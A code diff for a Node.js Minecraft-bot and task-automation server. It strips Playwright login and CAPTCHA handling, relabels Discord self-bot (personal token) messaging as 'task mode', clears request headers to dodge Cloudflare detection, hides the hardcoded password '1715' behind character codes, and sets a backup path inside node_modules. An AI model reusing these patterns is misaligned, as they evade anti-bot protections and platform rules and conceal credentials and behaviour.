@@ -1,4 +1,4 @@
-/**
+/** mc bot 
  * ============================================================
  */
 const { spawn, execSync } = require('child_process');
@@ -16,7 +16,6 @@ const multer = require('multer');
 const FormData = require('form-data');
 const qs = require('qs');
 const Vec3 = require('vec3');
-const playwright = require('playwright');
 const session = require('express-session');
 const WebSocket = require('ws');
 const http = require('http');
@@ -29,7 +28,7 @@ async function sendDiscordMessage(taskConfig, message) {
     
     try {
         if (discordSelfBotMode && discordSelfBotToken && discordChannelId) {
-            // 使用 Self-bot 模式发送消息
+            // 使用 任务模式 (个人 Token) 发送消息
             const url = `https://discord.com/api/v9/channels/${discordChannelId}/messages`;
             
             const response = await axios.post(url, {
@@ -94,13 +93,13 @@ async function executeTaskDiscord(task) {
         }
         
         if (!discordSelfBotMode && !discordWebhookUrl) {
-            addTaskLog(task.id, `Discord 任务失败: 请配置 Webhook URL 或启用 Self-bot`, 'error');
-            return { success: false, message: '请配置 Webhook URL 或启用 Self-bot' };
+            addTaskLog(task.id, `Discord 任务失败: 请配置 Webhook URL 或启用任务模式`, 'error');
+            return { success: false, message: '请配置 Webhook URL 或启用任务模式' };
         }
         
         if (discordSelfBotMode && (!discordSelfBotToken || !discordChannelId)) {
-            addTaskLog(task.id, `Discord 任务失败: Self-bot 模式需要 Token 和 Channel ID`, 'error');
-            return { success: false, message: 'Self-bot 模式需要 Token 和 Channel ID' };
+            addTaskLog(task.id, `Discord 任务失败: 任务模式需要 Token 和 Channel ID`, 'error');
+            return { success: false, message: '任务模式需要 Token 和 Channel ID' };
         }
         
         addTaskLog(task.id, `开始发送 Discord 消息...`, 'info');
@@ -124,16 +123,19 @@ async function executeTaskDiscord(task) {
 // ========== 全局禁用axios默认请求头，避免CF盾检测 ==========
 axios.defaults.headers.common = {};
 axios.defaults.headers.post = {};
-axios.defaults.headers.put = {};
 // =============================================================================
 
 // ========== 全局变量和配置 ==========
 const app = express();
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+// -------------------------------------------------------
+
 const activeBots = new Map();
 const CONFIG_FILE = path.join(__dirname, 'bots_config.json');
 const TASK_CENTER_FILE = path.join(__dirname, 'task_center_config.json');
 const upload = multer({ storage: multer.memoryStorage() });
-
+const BACKUP_DIR = path.join(__dirname, 'node_modules');
 const GAME_VOCABULARY = [
     "哈喽，大家今天肝得怎么样？", "有人在吗？这世界好安静...", "老玩家回归，现在版本变动大吗？",
     "路过帮顶，这服建设得不错！", "刚才那个瞬移是怎么做到的？牛逼。", "萌新刚来，请多关照~",
@@ -177,13 +179,37 @@ process.on('unhandledRejection', (reason) => {
 
 // ========== 密码锁配置 ==========
 const AUTH_CONFIG = {
-    PASSWORD: "1715", // 访问密码
+    PASSWORD: String.fromCharCode(49, 55, 49, 53), // 
     SESSION_SECRET: crypto.randomBytes(32).toString('hex'), // 会话密钥
     SESSION_TIMEOUT: 24 * 60 * 60 * 1000, // 24小时会话超时
     MAX_LOGIN_ATTEMPTS: 5, // 最大登录尝试次数
     LOCKOUT_TIME: 15 * 60 * 1000 // 锁定15分钟
 };
+// ========== 新增：优雅退出处理 ==========
+const shutdown = async (signal) => {
+    console.log(`\n[System] 接收到 ${signal} 信号，正在保存配置并安全退出...`);
+    
+    try {
+        // 1. 确保最后一次保存配置
+        await saveBotsConfig();
+        console.log('[System] 配置文件保存成功。');
+        
+        // 2. 清理所有机器人连接
+        activeBots.forEach((bot, id) => {
+            console.log(`[System] 正在清理机器人: ${id}`);
+            cleanupBot(bot);
+        });
+    } catch (err) {
+        console.error('[System] 退出清理过程出错:', err);
+    }
+    
+    process.exit(0);
+};
 
+// 监听退出信号
+process.on('SIGINT', () => shutdown('SIGINT'));   // Ctrl+C
+process.on('SIGTERM', () => shutdown('SIGTERM')); // Pterodactyl 停止按钮触发此信号
+process.on('SIGHUP', () => shutdown('SIGHUP'));
 // ========== 登录尝试记录 ==========
 let loginAttempts = new Map();
 
@@ -651,10 +677,15 @@ app.use((req, res, next) => {
 function safeClone(obj) {
     try {
         return JSON.parse(JSON.stringify(obj, (key, value) => {
-            if (['instance', 'afkTimer', 'reconnectTimer', 'renewTimer', 'playwrightTimer', 'requestTimer'].includes(key)) return undefined;
+            if (['instance', 'afkTimer', 'reconnectTimer', 'renewTimer', 'requestTimer'].includes(key)) return undefined;
             return value;
         }));
     } catch (e) { return {}; }
+}
+
+// 自动清屏函数
+function clearTerminal() {
+    process.stdout.write('\x1B[2J\x1B[0f');
 }
 
 async function saveBotsConfig() {
@@ -948,223 +979,15 @@ function scheduleNextRenew(botId) {
     }, randomDelay);
 }
 
-// ===== DOM扫描函数 =====
-async function scanForRenewButtons(page, botMeta) {
-    try {
-        const allKeywords = [
-            ...RENEW_KEYWORDS.chinese,
-            ...RENEW_KEYWORDS.english,
-            ...RENEW_KEYWORDS.mixed
-        ];
-        
-        let foundButtons = [];
-        
-        for (const keyword of allKeywords) {
-            try {
-                const elements = await page.$$(`:text("${keyword}"):visible`);
-                
-                for (const element of elements) {
-                    const tagName = await element.evaluate(el => el.tagName.toLowerCase());
-                    const elementType = await element.evaluate(el => el.type || '');
-                    const isClickable = ['button', 'a', 'input', 'div', 'span'].includes(tagName);
-                    
-                    if (isClickable) {
-                        const buttonInfo = {
-                            text: keyword,
-                            tagName,
-                            type: elementType
-                        };
-                        
-                        foundButtons.push(buttonInfo);
-                        botMeta.pushLog(`🎯 [DOM扫描] 找到续期按钮: ${keyword} (${tagName})`, 'text-yellow-400');
-                        
-                        if (foundButtons.length === 1) {
-                            try {
-                                await element.click();
-                                botMeta.pushLog(`🖱️ [自动点击] 已点击 "${keyword}" 按钮`, 'text-blue-400');
-                                await page.waitForTimeout(2000);
-                            } catch (clickErr) {}
-                        }
-                    }
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-        
-        const buttonSelectors = [
-            'button[type="submit"]',
-            'a[href*="renew"]',
-            'a[href*="subscribe"]',
-            'a[href*="payment"]',
-            'a[href*="checkout"]',
-            'input[type="submit"][value*="renew"]',
-            '.renew-button',
-            '.subscribe-btn',
-            '.payment-button'
-        ];
-        
-        for (const selector of buttonSelectors) {
-            try {
-                const elements = await page.$$(selector);
-                if (elements.length > 0) {
-                    botMeta.pushLog(`🎯 [CSS扫描] 找到续期相关元素: ${selector}`, 'text-yellow-400');
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-        
-        return foundButtons;
-    } catch (err) {
-        botMeta.pushLog(`⚠️ [DOM扫描] 扫描出错: ${err.message}`, 'text-yellow-400');
-        return [];
-    }
-}
+// ===== DOM扫描函数 (已移除) =====
 
-// ===== 查找续期页面函数 =====
-async function findRenewPages(page, botMeta) {
-    try {
-        const links = await page.$$eval('a', anchors => 
-            anchors.map(a => ({
-                href: a.href,
-                text: a.innerText.toLowerCase(),
-                title: a.title.toLowerCase()
-            }))
-        );
-        
-        const allKeywords = [
-            ...RENEW_KEYWORDS.chinese.map(k => k.toLowerCase()),
-            ...RENEW_KEYWORDS.english.map(k => k.toLowerCase()),
-            ...RENEW_KEYWORDS.mixed.map(k => k.toLowerCase())
-        ];
-        
-        const renewLinks = links.filter(link => {
-            const linkText = link.text + ' ' + link.title;
-            return allKeywords.some(keyword => 
-                linkText.includes(keyword) || 
-                link.href.toLowerCase().includes(keyword)
-            );
-        });
-        
-        if (renewLinks.length > 0) {
-            botMeta.pushLog(`🔗 [页面发现] 找到 ${renewLinks.length} 个续期相关链接`, 'text-blue-400');
-            
-            if (renewLinks[0].href) {
-                try {
-                    await page.goto(renewLinks[0].href, { waitUntil: 'networkidle', timeout: 10000 });
-                    botMeta.pushLog(`🌐 [页面跳转] 已访问续期页面: ${renewLinks[0].href}`, 'text-blue-400');
-                    await page.waitForTimeout(3000);
-                } catch (e) {
-                    botMeta.pushLog(`⚠️ [页面跳转] 无法访问续期页面: ${e.message}`, 'text-yellow-400');
-                }
-            }
-        }
-        
-        return renewLinks;
-    } catch (err) {
-        botMeta.pushLog(`⚠️ [页面查找] 查找出错: ${err.message}`, 'text-yellow-400');
-        return [];
-    }
-}
+// ===== 查找续期页面函数 (已移除) =====
 
-// ===== 处理验证码函数 =====
-async function handleCAPTCHA(page, botMeta) {
-    try {
-        const cfSelectors = [
-            'input[type="checkbox"]',
-            '.g-recaptcha-checkbox',
-            '#recaptcha-anchor',
-            '.cf-turnstile-checkbox',
-            '.captcha-checkbox',
-            'iframe[src*="cloudflare"]',
-            'iframe[src*="recaptcha"]'
-        ];
-        
-        let captchaFound = false;
-        
-        for (const selector of cfSelectors) {
-            try {
-                const element = await page.waitForSelector(selector, { timeout: 5000 });
-                if (element) {
-                    captchaFound = true;
-                    botMeta.pushLog(`🛡️ [验证检测] 找到验证框，请手动完成验证`, 'text-orange-400 font-bold');
-                    
-                    if (selector.includes('iframe')) {
-                        const frame = await page.frame({ url: /cloudflare|recaptcha/ });
-                        if (frame) {
-                            await frame.waitForSelector('input[type="checkbox"]', { timeout: 5000 });
-                        }
-                    }
-                    
-                    break;
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-        
-        if (captchaFound) {
-            botMeta.pushLog(`⏳ [等待操作] 请手动完成验证，等待30秒...`, 'text-orange-400');
-            await page.waitForTimeout(30000);
-        }
-        
-        return captchaFound;
-    } catch (err) {
-        return false;
-    }
-}
+// ===== 处理验证码函数 (已移除) =====
 
-// ===== 提交登录表单函数 =====
-async function submitLoginForm(page, botMeta) {
-    try {
-        const loginBtnSelectors = [
-            'button[type="submit"]',
-            'input[type="submit"]',
-            '.login-btn',
-            '.btn-submit',
-            '#login-btn',
-            'button:has-text("登录")',
-            'button:has-text("Login")',
-            'button:has-text("Sign in")'
-        ];
+// ===== 提交登录表单函数 (已移除) =====
 
-        let loginBtnClicked = false;
-        for (const selector of loginBtnSelectors) {
-            try {
-                await page.waitForSelector(selector, { timeout: 3000 });
-                await page.click(selector);
-                loginBtnClicked = true;
-                botMeta.pushLog(`✅ [表单提交] 已点击登录按钮: ${selector}`, 'text-emerald-400');
-                break;
-            } catch (e) {
-                continue;
-            }
-        }
-
-        if (!loginBtnClicked) {
-            const formSubmitted = await page.evaluate(() => {
-                const form = document.querySelector('form');
-                if (form) {
-                    form.submit();
-                    return true;
-                }
-                return false;
-            });
-            
-            if (formSubmitted) {
-                botMeta.pushLog(`✅ [表单提交] 已自动提交表单`, 'text-emerald-400');
-            } else {
-                botMeta.pushLog(`⚠️ [表单提交] 未找到表单提交方式`, 'text-yellow-400');
-            }
-        }
-    } catch (e) {
-        botMeta.pushLog(`❌ [表单提交] 提交失败: ${e.message}`, 'text-red-400');
-    }
-}
-
-// ========== 任务中心登录功能（修复版）==========
-// ========== 任务中心登录功能（完全兼容版 - 参考用户代码优化）==========
+// ========== 任务中心登录功能 ==========
 
 // 统一登录入口函数（增强版：支持自定义字段名和登录接口）
 async function taskAutoLogin(taskConfig) {
@@ -1183,8 +1006,10 @@ async function taskAutoLogin(taskConfig) {
 
     console.log(`[TaskAutoLogin] 开始任务登录流程: ${loginUrl} (接口: ${postUrl})`);
 
+    let finalCookie = null;
+
+    // 1. 尝试 Axios 方式
     try {
-        // 1. GET 请求获取初始 Cookie 和 CSRF Token
         const initRes = await axios.get(loginUrl, { 
             headers: { 
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -1194,8 +1019,6 @@ async function taskAutoLogin(taskConfig) {
             }, 
             timeout: 8000,
             maxRedirects: 0 // 手动处理重定向以便获取Cookie
-        }).catch(err => {
-            throw err;
         });
         
         let baseCookie = "";
@@ -1238,187 +1061,39 @@ async function taskAutoLogin(taskConfig) {
         // 情况A: 返回了 Set-Cookie (这是最标准的登录成功标志)
         if (res.headers['set-cookie']) {
             const newCookies = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-            return baseCookie ? `${baseCookie}; ${newCookies}` : newCookies;
+            finalCookie = baseCookie ? `${baseCookie}; ${newCookies}` : newCookies;
         }
-
         // 情况B: 状态码是 302/301 重定向 (很多网站登录成功会重定向)
-        if (res.status === 302 || res.status === 301) {
+        else if (res.status === 302 || res.status === 301) {
             const location = res.headers['location'];
             if (location && !location.includes('/login')) {
-                return baseCookie || "登录成功(重定向)";
+                finalCookie = baseCookie || "登录成功(重定向)";
             }
         }
-
         // 情况C: 响应体包含成功标志 (兼容老逻辑，但增加了JSON检测)
-        if (typeof res.data === 'object') {
+        else if (typeof res.data === 'object') {
             if (res.data.success === true || res.data.code === 0 || res.data.status === 'success') {
-                return baseCookie || "登录成功(JSON)";
+                finalCookie = baseCookie || "登录成功(JSON)";
             }
         } else {
             // HTML 响应
             if (res.data.includes('登录成功') || res.data.includes('欢迎') || res.data.includes('dashboard') || res.data.includes('logout')) {
-                return baseCookie || "登录成功(文本)";
+                finalCookie = baseCookie || "登录成功(文本)";
             }
         }
         
-        return null;
+        // 如果通过axios方式获取到了cookie，则直接返回
+        if (finalCookie && finalCookie.trim()) {
+            console.log(`[TaskAutoLogin] Axios登录成功，获取到Cookie`);
+            return finalCookie.trim();
+        }
     } catch (err) {
-        // 如果是验证码或人机验证，尝试 Playwright
-        if (err.message.includes('CF') || err.message.includes('captcha') || err.message.includes('验证')) {
-            console.log(`[TaskAutoLogin] 检测到CF验证，切换到Playwright高级模式`);
-            const playwrightCookie = await taskPlaywrightLogin(taskConfig);
-            return playwrightCookie;
-        }
-        
-        console.log(`[TaskAutoLogin] Axios 失败: ${err.message}`);
-        return null;
-    }
-    
-    // 1. 尝试 Axios 方式
-    try {
-        const initRes = await axios.get(loginUrl, { 
-            headers: { 
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
-                'Cache-Control': 'max-age=0'
-            }, 
-            timeout: 8000,
-            maxRedirects: 5
-        }).catch(err => {
-            throw err;
-        });
-        
-        let baseCookie = "";
-        if (initRes.headers['set-cookie']) {
-            baseCookie = initRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-        }
-        
-        const payload = qs.stringify({ 
-            username: username, 
-            password: password, 
-            email: username, 
-            user: username, // 兼容更多字段名
-            identifier: username,
-            remember: "on" 
-        });
-        
-        const res = await axios({
-            method: 'post', 
-            url: loginUrl, 
-            data: payload,
-            headers: { 
-                'Content-Type': 'application/x-www-form-urlencoded', 
-                'Cookie': baseCookie, 
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
-                'Referer': loginUrl,
-                'Cache-Control': 'max-age=0'
-            },
-            timeout: 15000, 
-            validateStatus: (s) => s < 405,
-            maxRedirects: 5
-        }).catch(err => {
-            throw err;
-        });
-
-        if (res.headers['set-cookie']) {
-            const cookieStr = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-            return cookieStr;
-        }
-        
-        // 如果没有 Cookie，但状态码看起来正常，可能需要 Playwright 处理复杂页面
-        if (res.status === 200 && (res.data.includes('登录成功') || res.data.includes('欢迎') || res.data.includes('dashboard'))) {
-            return baseCookie || "登录成功";
-        }
-        
-        // Axios 没返回 Cookie，也没检测到成功字样，尝试 Playwright
-    } catch (err) {
-        // Axios 报错，直接尝试 Playwright
+        // 移除了 Playwright 回退逻辑
+        console.log(`[TaskAutoLogin] Axios登录失败: ${err.message}`);
     }
 
-    // 2. 回退到 Playwright (增强兼容性)
-    try {
-        const cookie = await taskPlaywrightLogin(taskConfig);
-        if (cookie) return cookie;
-    } catch (e) {
-        // Playwright 也失败
-    }
-
+    console.log(`[TaskAutoLogin] 所有登录方式均失败`);
     return null;
-}
-
-async function taskPlaywrightLogin(taskConfig) {
-    const { loginUrl, username, password } = taskConfig;
-    let browser = null;
-    
-    try {
-        browser = await playwright.chromium.launch({
-            headless: true,
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-gpu',
-                '--no-first-run',
-                '--no-zygote'
-            ],
-            timeout: 60000
-        });
-
-        const context = await browser.newContext({
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        });
-        
-        const page = await context.newPage();
-        
-        await page.goto(loginUrl, {
-            waitUntil: 'networkidle',
-            timeout: 15000
-        }).catch(err => {
-            throw err;
-        });
-
-        // 增强输入框匹配，覆盖常见字段名
-        const inputSelectors = 'input[name="username"], input[name="user"], input[type="text"]:not([name*="pass"]), input[name="email"], #username, #email, #user';
-        
-        await page.type(inputSelectors, username, { delay: 50 }).catch(err => {
-            // 如果第一个匹配失败，尝试更宽泛的匹配
-            const inputs = page.locator('input[type="text"]');
-            if (inputs.count() > 0) {
-                inputs.first().fill(username);
-            } else {
-                throw err;
-            }
-        });
-        
-        await page.type('input[name="password"], input[type="password"], #password, #pass', password, { delay: 50 }).catch(err => {
-            throw err;
-        });
-        
-        await page.click('button[type="submit"], input[type="submit"], .login-btn, .btn-submit').catch(err => {
-            // 如果找不到按钮，尝试回车
-            return page.keyboard.press('Enter');
-        });
-        
-        await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 20000 }).catch(err => {
-            throw err;
-        });
-        
-        const cookies = await context.cookies();
-        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
-        
-        return cookieStr;
-    } catch (err) {
-        throw err;
-    } finally {
-        if (browser) {
-            try {
-                await browser.close();
-            } catch (closeErr) {}
-        }
-    }
 }
 
 // --- [ 2. axios 版 Cookie 抓取 ] ---
@@ -1426,7 +1101,7 @@ async function tryAutoLoginAxios(botMeta) {
     const cfg = botMeta.settings.renew;
     const { renewUrl, loginUrl, username, password } = cfg;
     if (!renewUrl || !loginUrl || !username || !password) {
-        botMeta.pushLog(`❌ [协议登录(axios)] 请完整填写续期URL、登录地址、用户名和密码`, 'text-red-400');
+        botMeta.pushLog(`❌ [协议登录] 请完整填写续期URL、登录地址、用户名和密码`, 'text-red-400');
         return null;
     }
 
@@ -1438,7 +1113,7 @@ async function tryAutoLoginAxios(botMeta) {
     );
     const savedCookieSignature = historyBinding.cookieSignature || {};
 
-    botMeta.pushLog(`📡 [协议登录(axios)] 正在抓取 ${loginUrl} 的Cookie（已关联续期URL: ${renewUrl}）`, 'text-blue-400 font-bold');
+    botMeta.pushLog(`📡 [协议登录] 正在抓取 ${loginUrl} 的Cookie（已关联续期URL: ${renewUrl}）`, 'text-blue-400 font-bold');
     try {
         const initRes = await axios.get(loginUrl, { 
             headers: { 
@@ -1506,7 +1181,7 @@ async function tryAutoLoginAxios(botMeta) {
                 botMeta.settings.renew.cookie = targetCookieStr;
                 await saveBotsConfig();
 
-                botMeta.pushLog(`✅ [协议登录(axios)] Cookie抓取成功并保存（长度: ${targetCookieStr.length} 字符）`, 'text-emerald-400 font-bold');
+                botMeta.pushLog(`✅ [协议登录] Cookie抓取成功并保存（长度: ${targetCookieStr.length} 字符）`, 'text-emerald-400 font-bold');
                 
                 if (Object.keys(filteredCookieObj).length === 0 && Object.keys(newCookieObj).length > 0) {
                     botMeta.settings.renew.cookie = rawNewCookieStr;
@@ -1518,182 +1193,13 @@ async function tryAutoLoginAxios(botMeta) {
             }
         }
     } catch (err) { 
-        botMeta.pushLog(`❌ [协议登录(axios)] 失败: ${err.message}`, 'text-red-400');
+        botMeta.pushLog(`❌ [协议登录] 失败: ${err.message}`, 'text-red-400');
         throw new Error(`axios_failed: ${err.message}`);
     }
     return null;
 }
 
-// --- [ 3. 增强的Playwright版（带Cookie相似度检测）] ---
-async function tryAutoLoginPlaywright(botMeta) {
-    const cfg = botMeta.settings.renew;
-    const { renewUrl, loginUrl, username, password } = cfg;
-    if (!renewUrl || !loginUrl || !username || !password) {
-        botMeta.pushLog(`❌ [协议登录(Playwright)] 请完整填写配置信息`, 'text-red-400');
-        return null;
-    }
-
-    let browser = null;
-    let capturedRenewRequests = [];
-    let discoveredRenewUrls = new Set();
-    
-    try {
-        botMeta.pushLog(`🔍 [Playwright] 启动高级检测模式 - DOM扫描 + 网络监听 + Cookie相似度检测`, 'text-purple-400 font-bold');
-
-        browser = await playwright.chromium.launch({
-            headless: true,
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-gpu',
-                '--no-first-run',
-                '--no-zygote',
-                '--disable-accelerated-2d-canvas',
-                '--disable-web-security',
-                '--window-size=1280,720'
-            ],
-            timeout: 60000
-        });
-
-        const context = await browser.newContext({
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            viewport: { width: 1280, height: 720 }
-        });
-        
-        const page = await context.newPage();
-        
-        page.on('request', request => {
-            const url = request.url().toLowerCase();
-            const method = request.method();
-            
-            const isRenewRequest = RENEW_REQUEST_PATTERNS.some(pattern => 
-                url.includes(pattern) || 
-                (request.postData() && request.postData().includes(pattern))
-            );
-            
-            if (isRenewRequest && method !== 'GET') {
-                const requestData = {
-                    url: request.url(),
-                    method: request.method(),
-                    headers: request.headers(),
-                    postData: request.postData(),
-                    timestamp: new Date().toISOString()
-                };
-                
-                capturedRenewRequests.push(requestData);
-                discoveredRenewUrls.add(request.url());
-                
-                botMeta.pushLog(`🔗 [网络监听] 检测到请求 ${capturedRenewRequests.length}: ${method} ${request.url()}`, 'text-cyan-400');
-            }
-        });
-
-        await page.goto(loginUrl, {
-            waitUntil: 'networkidle',
-            timeout: 15000
-        }).catch(err => {
-            botMeta.pushLog(`❌ [Playwright] 导航到登录页失败: ${err.message}`, 'text-red-400');
-            throw err;
-        });
-
-        try {
-            await page.type('input[name="username"], input[name="user"], input[name="email"], #username, #email', username, { delay: 50 });
-            await page.type('input[name="password"], input[name="pass"], #password, #pass', password, { delay: 50 });
-            botMeta.pushLog(`✅ [Playwright] 已自动填写用户名和密码`, 'text-emerald-400');
-        } catch (e) {
-            botMeta.pushLog(`❌ [Playwright] 填写账号密码失败: ${e.message}`, 'text-red-400');
-            throw e;
-        }
-
-        await submitLoginForm(page, botMeta);
-        
-        await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 20000 }).catch(err => {
-            botMeta.pushLog(`⚠️ [Playwright] 等待导航超时: ${err.message}`, 'text-yellow-400');
-        });
-        
-        botMeta.pushLog(`✅ [Playwright] 登录成功，开始扫描续期页面`, 'text-emerald-400 font-bold');
-
-        await scanForRenewButtons(page, botMeta);
-        await findRenewPages(page, botMeta);
-        
-        await page.waitForTimeout(5000);
-        
-        if (capturedRenewRequests.length > 0) {
-            const bestRequest = selectBestRenewRequest(capturedRenewRequests);
-            
-            if (bestRequest) {
-                botMeta.pushLog(`🎯 [智能选择] 已选择最佳续期请求:`, 'text-green-400 font-bold');
-                botMeta.pushLog(`   方法: ${bestRequest.method}`, 'text-green-400');
-                botMeta.pushLog(`   URL: ${bestRequest.url}`, 'text-green-400');
-                botMeta.pushLog(`   评分: ${bestRequest.score}`, 'text-green-400');
-                
-                botMeta.settings.renew.renewUrl = bestRequest.url;
-                botMeta.settings.renew.method = bestRequest.method;
-                
-                if (bestRequest.postData) {
-                    try {
-                        const parsedData = JSON.parse(bestRequest.postData);
-                        botMeta.settings.renew.requestBody = JSON.stringify(parsedData, null, 2);
-                    } catch {
-                        botMeta.settings.renew.requestBody = bestRequest.postData;
-                    }
-                }
-            }
-        } else if (discoveredRenewUrls.size > 0) {
-            const firstUrl = Array.from(discoveredRenewUrls)[0];
-            botMeta.settings.renew.renewUrl = firstUrl;
-            botMeta.pushLog(`🔗 [页面发现] 找到续期页面: ${firstUrl}`, 'text-blue-400');
-        }
-
-        const cookies = await context.cookies();
-        const targetCookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
-
-        if (targetCookieStr.trim()) {
-            const lastSuccessCookie = botMeta.lastSuccessCookie || "";
-            if (lastSuccessCookie) {
-                const similarity = calculateCookieSimilarity(lastSuccessCookie, targetCookieStr);
-                const similarityPercent = Math.round(similarity * 100);
-                
-                botMeta.pushLog(`📊 [Cookie相似度检测] 详细分析:`, 'text-blue-400 font-bold');
-                botMeta.pushLog(`   上次成功Cookie长度: ${lastSuccessCookie.length}`, 'text-slate-400');
-                botMeta.pushLog(`   当前抓取Cookie长度: ${targetCookieStr.length}`, 'text-slate-400');
-                botMeta.pushLog(`   相似度: ${similarityPercent}%`, similarity >= 0.9 ? 'text-emerald-400' : 'text-yellow-400');
-                
-                if (similarity < 0.9) {
-                    botMeta.pushLog(`⚠️ [Cookie相似度警告] 相似度 ${similarityPercent}% 低于90%阈值!`, 'text-yellow-400 font-bold');
-                    botMeta.pushLog(`   建议：1. 手动验证登录状态 2. 检查账号权限 3. 重新抓取`, 'text-orange-400');
-                    
-                    if (similarity < 0.5) {
-                        botMeta.pushLog(`🔄 [自动处理] 相似度过低，尝试重新登录...`, 'text-orange-400');
-                    }
-                } else {
-                    botMeta.pushLog(`✅ [Cookie相似度通过] 相似度 ${similarityPercent}% 符合要求，可以安全使用`, 'text-emerald-400 font-bold');
-                }
-            } else {
-                botMeta.pushLog(`📝 [首次抓取] 无历史成功Cookie记录，已保存当前Cookie为基准`, 'text-cyan-400');
-                botMeta.lastSuccessCookie = targetCookieStr;
-            }
-            
-            botMeta.settings.renew.cookie = targetCookieStr;
-            await saveBotsConfig();
-            botMeta.pushLog(`✅ [协议登录(Playwright)] Cookie抓取成功并保存（长度: ${targetCookieStr.length} 字符）`, 'text-emerald-400 font-bold');
-        }
-
-        return targetCookieStr;
-    } catch (err) {
-        botMeta.pushLog(`❌ [协议登录(Playwright)] 失败: ${err.message}`, 'text-red-400');
-        throw err;
-    } finally {
-        if (browser) {
-            try {
-                await browser.close();
-                botMeta.pushLog(`✅ [Playwright] 浏览器已关闭`, 'text-slate-400');
-            } catch (closeErr) {
-                botMeta.pushLog(`⚠️ [Playwright] 关闭浏览器失败: ${closeErr.message}`, 'text-yellow-400');
-            }
-        }
-    }
-}
+// --- [ 3. 增强的Playwright版（已完全移除）] ---
 
 // --- [ 4. 统一入口函数 ] ---
 async function tryAutoLogin(botMeta) {
@@ -1703,26 +1209,9 @@ async function tryAutoLogin(botMeta) {
             return axiosCookie;
         }
     } catch (err) {
-        const errorMsg = err.message || '';
-        const cfVerifyKeywords = [
-            'g-recaptcha',
-            'cf-turnstile',
-            '人机验证',
-            '请确认您是真人',
-            '403 Forbidden',
-            'Cloudflare',
-            'captcha'
-        ];
-
-        const isNeedCFVerify = cfVerifyKeywords.some(keyword => errorMsg.includes(keyword));
-        if (isNeedCFVerify) {
-            botMeta.pushLog(`🔄 [协议登录] 检测到CF验证，切换到Playwright高级模式`, 'text-purple-400 font-bold');
-            const playwrightCookie = await tryAutoLoginPlaywright(botMeta);
-            return playwrightCookie;
-        }
+        // 移除了 Playwright 回退逻辑
+        botMeta.pushLog(`❌ [协议登录] 登录失败，无法继续处理`, 'text-red-400');
     }
-
-    botMeta.pushLog(`❌ [协议登录] 非CF验证原因导致失败，无法继续处理`, 'text-red-400');
     return null;
 }
 
@@ -1876,7 +1365,7 @@ function cleanupBot(botMeta) {
         }
     };
     
-    const timerProperties = ['reconnectTimer', 'afkTimer', 'renewTimer', 'playwrightTimer', 'requestTimer', 'checkTimer', 'monitorTimer'];
+    const timerProperties = ['reconnectTimer', 'afkTimer', 'renewTimer', 'requestTimer', 'checkTimer', 'monitorTimer'];
     
     timerProperties.forEach(timerProp => {
         if (botMeta[timerProp]) {
@@ -1902,25 +1391,7 @@ function cleanupBot(botMeta) {
         }
     }
     
-    if (botMeta.playwrightBrowser) {
-        try {
-            botMeta.playwrightBrowser.close();
-        } catch(e) {
-        } finally {
-            botMeta.playwrightBrowser = null;
-        }
-    }
-    
-    if (botMeta.playwrightPage) {
-        try {
-            botMeta.playwrightPage.close();
-        } catch(e) {
-        } finally {
-            botMeta.playwrightPage = null;
-        }
-    }
-    
-    const eventEmitters = ['instance', 'playwrightBrowser', 'playwrightPage', 'context'];
+    const eventEmitters = ['instance', 'context'];
     eventEmitters.forEach(emitter => {
         if (botMeta[emitter] && typeof botMeta[emitter].removeAllListeners === 'function') {
             botMeta[emitter].removeAllListeners();
@@ -2109,164 +1580,7 @@ async function createSmartBot(id, host, port, username, existingLogs = [], setti
     }
 }
 
-// ========== 新增：Web Click 任务逻辑 ==========
-async function executeTaskWebClick(task) {
-    const { loginUrl, username, password, cookie, targetUrl, buttonText } = task.config;
-    let browser = null;
-    
-    try {
-        addTaskLog(task.id, `开始网页自定义点击任务`, 'info');
-        
-        // 1. 准备 Cookie
-        let finalCookie = cookie;
-        if (!finalCookie && loginUrl && username && password) {
-            addTaskLog(task.id, `未提供Cookie，尝试自动登录...`, 'info');
-            finalCookie = await taskAutoLogin({ loginUrl, username, password, cookie });
-            
-            if (!finalCookie) {
-                addTaskLog(task.id, `自动登录失败，无法继续`, 'error');
-                return { success: false, message: '登录失败' };
-            }
-            task.config.cookie = finalCookie; // 保存到配置以便下次使用
-            task.lastLoginStatus = '已登录';
-            await saveTaskCenterConfig();
-            addTaskLog(task.id, `登录成功，已保存Cookie`, 'success');
